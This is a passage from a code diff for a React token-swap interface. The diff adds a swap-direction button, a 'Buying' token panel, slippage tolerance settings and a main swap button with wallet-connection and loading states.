-          </>
-        )}
-      </motion.div>
+        {/* Swap Button */}
+        <div className="flex justify-center my-2 sm:-my-2 relative z-20">
+          <button
+            onClick={handleSwapTokens}
+            className="p-3 glass-card rounded-xl hover:scale-110 hover:rotate-180 transition-all duration-300 hover:glow-effect"
+          >
+            <ArrowDownUp className="w-5 h-5 text-primary" />
+          </button>
+        </div>
 
-      {/* Token Search Modal */}
-      <AnimatePresence>
-        {showTokenSearch && (
-          <TokenSearch
-            onSelect={(token) => {
-              setShowTokenSearch(false);
-              // Add token handling logic here
-            }}
-            onClose={() => setShowTokenSearch(false)}
-          />
-        )}
-      </AnimatePresence>
-    </div>
+        {/* To Token */}
+        <div className="space-y-2">
+          <label className="text-sm font-medium text-muted-foreground">Buying</label>
+          <div className="glass-card p-4 rounded-2xl">
+            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 min-w-0">
+              <TokenSearch selectedToken={toToken} onSelectToken={handleToTokenSelect} />
+              <div className="flex-1 min-w-0 text-left sm:text-right w-full">
+                <Input
+                  type="number"
+                  placeholder="0.00"
+                  value={toAmount}
+                  readOnly
+                  className="w-full text-2xl sm:text-3xl font-bold bg-transparent border-none focus-visible:ring-0 p-0 text-left sm:text-right"
+                />
+                {connected && publicKey && toAmount && toTokenPrice > 0 && (
+                  <div className="text-xs text-muted-foreground mt-1">
+                    ${(parseFloat(toAmount) * toTokenPrice).toFixed(2)}
+                  </div>
+                )}
+              </div>
+            </div>
+          </div>
+        </div>
+
+        {/* Swap Settings */}
+        <div className="mt-4 glass-card p-4 rounded-2xl">
+          <div className="flex items-center justify-between">
+            <span className="text-sm text-muted-foreground">Slippage Tolerance</span>
+            <div className="flex items-center gap-2">
+              {['0.1', '1.0'].map((value) => (
+                <button
+                  key={value}
+                  onClick={() => setSlippage(value)}
+                  className={`px-3 py-1 rounded-lg text-sm font-medium transition-all ${
+                    slippage === value
+                      ? 'bg-gradient-to-r from-primary to-secondary text-white'
+                      : 'bg-muted/50 hover:bg-muted'
+                  }`}
+                >
+                  {value}%
+                </button>
+              ))}
+              <Input
+                type="number"
+                value={slippage}
+                onChange={(e) => setSlippage(e.target.value)}
+                className="w-16 text-center"
+              />
+            </div>
+          </div>
+        </div>
+
+        {/* Swap Button */}
+        <Button
+          onClick={handleSwap}
+          disabled={!connected || isSwapping || !fromToken || !toToken}
+          className="w-full mt-6 h-14 text-lg font-bold rounded-xl bg-gradient-to-r from-primary via-secondary to-accent hover:scale-[1.02] transition-all shadow-lg hover:shadow-primary/50 disabled:opacity-50 disabled:cursor-not-allowed"
+        >
+          {!connected ? (
+            'Connect Wallet'
+          ) : isSwapping ? (
+            <div className="flex items-center gap-2">
+              <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+              Swapping...
+            </div>
+          ) : (
+            'Swap Tokens'
+          )}
+        </Button>
+      </div>
+    </motion.div>
   );
 };
-
-export default SwapInterface;
